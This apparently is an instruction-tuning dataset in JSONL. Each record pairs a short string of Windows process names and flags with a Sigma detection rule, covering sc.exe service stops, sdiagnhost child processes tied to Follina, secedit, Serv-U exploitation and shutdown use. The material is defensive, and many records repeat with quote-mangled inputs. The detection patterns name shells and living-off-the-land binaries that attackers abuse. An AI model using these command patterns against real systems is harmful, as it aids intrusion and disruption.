{"instruction": "Write Sigma rule to detect payload:", "input": "sc.exe \\sc.exe stop", "output": "title: Stop Windows Service Via Sc.EXE\nid: 81bcb81b-5b1f-474b-b373-52c871aaa7b1\nrelated:\n    - id: eb87818d-db5d-49cc-a987-d5da331fbd90\n      type: obsolete\nstatus: test\ndescription: Detects the stopping of a Windows service via the \"sc.exe\" utility\nreferences:\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742107(v=ws.11)\nauthor: Jakob Weinzettl, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-05\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'sc.exe'\n        - Image|endswith: '\\sc.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behavior in particular. Filter legitimate activity accordingly\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sc.exe \\sc.exe \"stop\"", "output": "title: Stop Windows Service Via Sc.EXE\nid: 81bcb81b-5b1f-474b-b373-52c871aaa7b1\nrelated:\n    - id: eb87818d-db5d-49cc-a987-d5da331fbd90\n      type: obsolete\nstatus: test\ndescription: Detects the stopping of a Windows service via the \"sc.exe\" utility\nreferences:\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742107(v=ws.11)\nauthor: Jakob Weinzettl, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-05\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'sc.exe'\n        - Image|endswith: '\\sc.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behavior in particular. Filter legitimate activity accordingly\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sc.exe \\sc.exe stop", "output": "title: Stop Windows Service Via Sc.EXE\nid: 81bcb81b-5b1f-474b-b373-52c871aaa7b1\nrelated:\n    - id: eb87818d-db5d-49cc-a987-d5da331fbd90\n      type: obsolete\nstatus: test\ndescription: Detects the stopping of a Windows service via the \"sc.exe\" utility\nreferences:\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742107(v=ws.11)\nauthor: Jakob Weinzettl, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-05\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'sc.exe'\n        - Image|endswith: '\\sc.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behavior in particular. Filter legitimate activity accordingly\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sc \\sc stop", "output": "title: Stop Windows Service Via Sc.EXE\nid: 81bcb81b-5b1f-474b-b373-52c871aaa7b1\nrelated:\n    - id: eb87818d-db5d-49cc-a987-d5da331fbd90\n      type: obsolete\nstatus: test\ndescription: Detects the stopping of a Windows service via the \"sc.exe\" utility\nreferences:\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742107(v=ws.11)\nauthor: Jakob Weinzettl, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-05\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'sc.exe'\n        - Image|endswith: '\\sc.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behavior in particular. Filter legitimate activity accordingly\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sc.exe stop \\sc.exe", "output": "title: Stop Windows Service Via Sc.EXE\nid: 81bcb81b-5b1f-474b-b373-52c871aaa7b1\nrelated:\n    - id: eb87818d-db5d-49cc-a987-d5da331fbd90\n      type: obsolete\nstatus: test\ndescription: Detects the stopping of a Windows service via the \"sc.exe\" utility\nreferences:\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742107(v=ws.11)\nauthor: Jakob Weinzettl, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-05\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'sc.exe'\n        - Image|endswith: '\\sc.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behavior in particular. Filter legitimate activity accordingly\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sdiagnhost.exe \\powershell.exe \\pwsh.exe \\cmd.exe \\mshta.exe \\cscript.exe \\wscript.exe \\taskkill.exe \\regsvr32.exe \\rundll32.exe \\calc.exe \\cmd.exe bits \\powershell.exe", "output": "title: Sdiagnhost Calling Suspicious Child Process\nid: f3d39c45-de1a-4486-a687-ab126124f744\nstatus: test\ndescription: Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\n    - https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    - https://app.any.run/tasks/c4117d9a-f463-461a-b90f-4cd258746798/\nauthor: Nextron Systems, @Kostastsale\ndate: 2022-06-01\nmodified: 2024-08-23\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\sdiagnhost.exe'\n        Image|endswith:\n            # Add more suspicious LOLBins\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n            - '\\mshta.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n            - '\\taskkill.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            # - '\\csc.exe'   # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n            - '\\calc.exe'  # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    filter_main_cmd_bits:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'bits'\n    filter_main_powershell_noprofile:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|endswith:\n            - '-noprofile -'\n            - '-noprofile'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sdiagnhost.exe \\powershell.exe \\pws\"h.exe\" \\cmd.exe \\mshta.exe \\cscript.exe \\wscript.exe \\taskkill.exe \\regsvr32.exe \\rundll32.exe \\calc.exe \\cmd.exe bits \\powershell.exe", "output": "title: Sdiagnhost Calling Suspicious Child Process\nid: f3d39c45-de1a-4486-a687-ab126124f744\nstatus: test\ndescription: Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\n    - https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    - https://app.any.run/tasks/c4117d9a-f463-461a-b90f-4cd258746798/\nauthor: Nextron Systems, @Kostastsale\ndate: 2022-06-01\nmodified: 2024-08-23\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\sdiagnhost.exe'\n        Image|endswith:\n            # Add more suspicious LOLBins\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n            - '\\mshta.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n            - '\\taskkill.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            # - '\\csc.exe'   # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n            - '\\calc.exe'  # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    filter_main_cmd_bits:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'bits'\n    filter_main_powershell_noprofile:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|endswith:\n            - '-noprofile -'\n            - '-noprofile'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sdiagnhost \\powershell \\pwsh \\cmd \\mshta \\cscript \\wscript \\taskkill \\regsvr32 \\rundll32 \\calc \\cmd bits \\powershell", "output": "title: Sdiagnhost Calling Suspicious Child Process\nid: f3d39c45-de1a-4486-a687-ab126124f744\nstatus: test\ndescription: Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\n    - https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    - https://app.any.run/tasks/c4117d9a-f463-461a-b90f-4cd258746798/\nauthor: Nextron Systems, @Kostastsale\ndate: 2022-06-01\nmodified: 2024-08-23\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\sdiagnhost.exe'\n        Image|endswith:\n            # Add more suspicious LOLBins\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n            - '\\mshta.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n            - '\\taskkill.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            # - '\\csc.exe'   # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n            - '\\calc.exe'  # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    filter_main_cmd_bits:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'bits'\n    filter_main_powershell_noprofile:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|endswith:\n            - '-noprofile -'\n            - '-noprofile'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sdiagnhost.exe \\powershell.exe \\pwsh.exe \\cmd.exe \\mshta.exe \\cscript.exe \\wscript.exe \\taskkill.exe \\regsvr32.exe \\rundll32.exe \\calc.exe \\cmd.exe bits \\powershell.exe", "output": "title: Sdiagnhost Calling Suspicious Child Process\nid: f3d39c45-de1a-4486-a687-ab126124f744\nstatus: test\ndescription: Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\n    - https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    - https://app.any.run/tasks/c4117d9a-f463-461a-b90f-4cd258746798/\nauthor: Nextron Systems, @Kostastsale\ndate: 2022-06-01\nmodified: 2024-08-23\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\sdiagnhost.exe'\n        Image|endswith:\n            # Add more suspicious LOLBins\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n            - '\\mshta.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n            - '\\taskkill.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            # - '\\csc.exe'   # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n            - '\\calc.exe'  # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    filter_main_cmd_bits:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'bits'\n    filter_main_powershell_noprofile:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|endswith:\n            - '-noprofile -'\n            - '-noprofile'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\secedit.exe SeCEdit /export /cfg /configure /db", "output": "title: Potential Suspicious Activity Using SeCEdit\nid: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb\nstatus: test\ndescription: Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy\nreferences:\n    - https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit\nauthor: Janantha Marasinghe\ndate: 2022-11-18\nmodified: 2022-12-30\ntags:\n    - attack.discovery\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.privilege-escalation\n    - attack.t1562.002\n    - attack.t1547.001\n    - attack.t1505.005\n    - attack.t1556.002\n    - attack.t1562\n    - attack.t1574.007\n    - attack.t1564.002\n    - attack.t1546.008\n    - attack.t1546.007\n    - attack.t1547.014\n    - attack.t1547.010\n    - attack.t1547.002\n    - attack.t1557\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\secedit.exe'\n        - OriginalFileName: 'SeCEdit'\n    selection_flags_discovery:\n        CommandLine|contains|all:\n            - '/export'\n            - '/cfg'\n    selection_flags_configure:\n        CommandLine|contains|all:\n            - '/configure'\n            - '/db'\n    # filter:\n    #     SubjectUserName|endswith: '$'  SubjectUserName is from event ID 4719 in the Windows Security log\n    condition: selection_img and (1 of selection_flags_*)\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\secedit.exe \\\"SeCEdit\\\" /export /cfg /configure /db", "output": "title: Potential Suspicious Activity Using SeCEdit\nid: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb\nstatus: test\ndescription: Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy\nreferences:\n    - https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit\nauthor: Janantha Marasinghe\ndate: 2022-11-18\nmodified: 2022-12-30\ntags:\n    - attack.discovery\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.privilege-escalation\n    - attack.t1562.002\n    - attack.t1547.001\n    - attack.t1505.005\n    - attack.t1556.002\n    - attack.t1562\n    - attack.t1574.007\n    - attack.t1564.002\n    - attack.t1546.008\n    - attack.t1546.007\n    - attack.t1547.014\n    - attack.t1547.010\n    - attack.t1547.002\n    - attack.t1557\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\secedit.exe'\n        - OriginalFileName: 'SeCEdit'\n    selection_flags_discovery:\n        CommandLine|contains|all:\n            - '/export'\n            - '/cfg'\n    selection_flags_configure:\n        CommandLine|contains|all:\n            - '/configure'\n            - '/db'\n    # filter:\n    #     SubjectUserName|endswith: '$'  SubjectUserName is from event ID 4719 in the Windows Security log\n    condition: selection_img and (1 of selection_flags_*)\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\secedit SeCEdit /export /cfg /configure /db", "output": "title: Potential Suspicious Activity Using SeCEdit\nid: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb\nstatus: test\ndescription: Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy\nreferences:\n    - https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit\nauthor: Janantha Marasinghe\ndate: 2022-11-18\nmodified: 2022-12-30\ntags:\n    - attack.discovery\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.privilege-escalation\n    - attack.t1562.002\n    - attack.t1547.001\n    - attack.t1505.005\n    - attack.t1556.002\n    - attack.t1562\n    - attack.t1574.007\n    - attack.t1564.002\n    - attack.t1546.008\n    - attack.t1546.007\n    - attack.t1547.014\n    - attack.t1547.010\n    - attack.t1547.002\n    - attack.t1557\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\secedit.exe'\n        - OriginalFileName: 'SeCEdit'\n    selection_flags_discovery:\n        CommandLine|contains|all:\n            - '/export'\n            - '/cfg'\n    selection_flags_configure:\n        CommandLine|contains|all:\n            - '/configure'\n            - '/db'\n    # filter:\n    #     SubjectUserName|endswith: '$'  SubjectUserName is from event ID 4719 in the Windows Security log\n    condition: selection_img and (1 of selection_flags_*)\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\secedit.exe SeCEdit /export /cfg /configure /db", "output": "title: Potential Suspicious Activity Using SeCEdit\nid: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb\nstatus: test\ndescription: Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy\nreferences:\n    - https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit\nauthor: Janantha Marasinghe\ndate: 2022-11-18\nmodified: 2022-12-30\ntags:\n    - attack.discovery\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.privilege-escalation\n    - attack.t1562.002\n    - attack.t1547.001\n    - attack.t1505.005\n    - attack.t1556.002\n    - attack.t1562\n    - attack.t1574.007\n    - attack.t1564.002\n    - attack.t1546.008\n    - attack.t1546.007\n    - attack.t1547.014\n    - attack.t1547.010\n    - attack.t1547.002\n    - attack.t1557\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\secedit.exe'\n        - OriginalFileName: 'SeCEdit'\n    selection_flags_discovery:\n        CommandLine|contains|all:\n            - '/export'\n            - '/cfg'\n    selection_flags_configure:\n        CommandLine|contains|all:\n            - '/configure'\n            - '/db'\n    # filter:\n    #     SubjectUserName|endswith: '$'  SubjectUserName is from event ID 4719 in the Windows Security log\n    condition: selection_img and (1 of selection_flags_*)\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Serv-U.exe \\cmd.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\cscript.exe \\sh.exe \\bash.exe \\schtasks.exe \\regsvr32.exe \\wmic.exe \\mshta.exe \\rundll32.exe \\msiexec.exe \\forfiles.exe \\scriptrunner.exe", "output": "title: Suspicious Serv-U Process Pattern\nid: 58f4ea09-0fc2-4520-ba18-b85c540b0eaf\nstatus: test\ndescription: Detects a suspicious process pattern which could be a sign of an exploited Serv-U service\nreferences:\n    - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-14\nmodified: 2022-07-14\ntags:\n    - attack.credential-access\n    - attack.t1555\n    - cve.2021-35211\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Serv-U.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Serv-U.exe \\cmd.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\cscript.exe \\\"\\\\\"\\\"s\\\"\\\"h\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" \\bash.exe \\schtasks.exe \\regsvr32.exe \\wmic.exe \\mshta.exe \\rundll32.exe \\msiexec.exe \\forfiles.exe \\scriptrunner.exe", "output": "title: Suspicious Serv-U Process Pattern\nid: 58f4ea09-0fc2-4520-ba18-b85c540b0eaf\nstatus: test\ndescription: Detects a suspicious process pattern which could be a sign of an exploited Serv-U service\nreferences:\n    - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-14\nmodified: 2022-07-14\ntags:\n    - attack.credential-access\n    - attack.t1555\n    - cve.2021-35211\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Serv-U.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Serv-U \\cmd \\powershell \\pwsh \\wscript \\cscript \\sh \\bash \\schtasks \\regsvr32 \\wmic \\mshta \\rundll32 \\msiexec \\forfiles \\scriptrunner", "output": "title: Suspicious Serv-U Process Pattern\nid: 58f4ea09-0fc2-4520-ba18-b85c540b0eaf\nstatus: test\ndescription: Detects a suspicious process pattern which could be a sign of an exploited Serv-U service\nreferences:\n    - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-14\nmodified: 2022-07-14\ntags:\n    - attack.credential-access\n    - attack.t1555\n    - cve.2021-35211\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Serv-U.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Serv-U.exe \\cmd.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\cscript.exe \\sh.exe \\bash.exe \\schtasks.exe \\regsvr32.exe \\wmic.exe \\mshta.exe \\rundll32.exe \\msiexec.exe \\forfiles.exe \\scriptrunner.exe", "output": "title: Suspicious Serv-U Process Pattern\nid: 58f4ea09-0fc2-4520-ba18-b85c540b0eaf\nstatus: test\ndescription: Detects a suspicious process pattern which could be a sign of an exploited Serv-U service\nreferences:\n    - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-14\nmodified: 2022-07-14\ntags:\n    - attack.credential-access\n    - attack.t1555\n    - cve.2021-35211\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Serv-U.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\shutdown.exe /r /s", "output": "title: Suspicious Execution of Shutdown\nid: 34ebb878-1b15-4895-b352-ca2eeb99b274\nstatus: test\ndescription: Use of the commandline to shutdown or reboot windows\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1529/T1529.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\nauthor: frack113\ndate: 2022-01-01\ntags:\n    - attack.impact\n    - attack.t1529\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains:\n            - '/r '\n            - '/s '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\shutdown /r /s", "output": "title: Suspicious Execution of Shutdown\nid: 34ebb878-1b15-4895-b352-ca2eeb99b274\nstatus: test\ndescription: Use of the commandline to shutdown or reboot windows\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1529/T1529.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\nauthor: frack113\ndate: 2022-01-01\ntags:\n    - attack.impact\n    - attack.t1529\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains:\n            - '/r '\n            - '/s '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\shutdown.exe /r /s", "output": "title: Suspicious Execution of Shutdown\nid: 34ebb878-1b15-4895-b352-ca2eeb99b274\nstatus: test\ndescription: Use of the commandline to shutdown or reboot windows\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1529/T1529.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\nauthor: frack113\ndate: 2022-01-01\ntags:\n    - attack.impact\n    - attack.t1529\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains:\n            - '/r '\n            - '/s '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\shutdown.exe /l", "output": "title: Suspicious Execution of Shutdown to Log Out\nid: ec290c06-9b6b-4338-8b6b-095c0f284f10\nstatus: test\ndescription: Detects the rare use of the command line tool shutdown to logoff a user\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1529/T1529.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\nauthor: frack113\ndate: 2022-10-01\ntags:\n    - attack.impact\n    - attack.t1529\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains: '/l'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
